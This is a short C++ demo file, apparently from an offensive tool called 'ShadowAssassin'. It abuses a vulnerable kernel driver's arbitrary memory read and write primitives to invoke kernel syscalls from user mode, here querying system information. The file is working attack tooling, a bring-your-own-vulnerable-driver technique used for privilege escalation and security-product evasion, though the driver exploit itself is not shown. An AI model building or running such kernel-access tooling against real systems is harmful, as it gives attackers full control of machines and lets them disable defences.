#include "shadowassassin.h"
#include "ReadWriteLibrary/VulnerableDriverReadWrite.h"


int main() {

    VulnerableDriver driver;
    ShadowAssassin assassin;

    driver.EnablePrimitives();

    assassin.SetReadPrimitive([&](UINT64* dst, UINT64 addr, UINT64 size) { driver.Read(dst, addr, size); });
    assassin.SetWritePrimitive([&](UINT64 addr, UINT64 data) { driver.Write(addr, data); });

    if (!assassin.Initialize()) { driver.CleanUp(); return 1; }




    //##################### 0x1337 Usermode Kernel Chudmaxing #####################

	UINT64 outBuf = (UINT64) new UINT64[0x8];

    UINT64 sysInfoResult = assassin.CallSyscall("NtQuerySystemInformation", {0, outBuf, 0x40, 0});

    UINT32 pageSize    = *(UINT32*)(outBuf + 0x08);
    UINT8  numCpus     = *(UINT8* )(outBuf + 0x38);
    UINT64 maxUserAddr = *(UINT64*)(outBuf + 0x28);

    printf("[ZwQuerySystemInformation] return=0x%llX  PageSize=0x%X  NumCpus=%u  MaxUserAddr=0x%llX\n", sysInfoResult, pageSize, numCpus, maxUserAddr);

    driver.CleanUp();
    DbgLog("[main] Done\n");
    return 0;
}
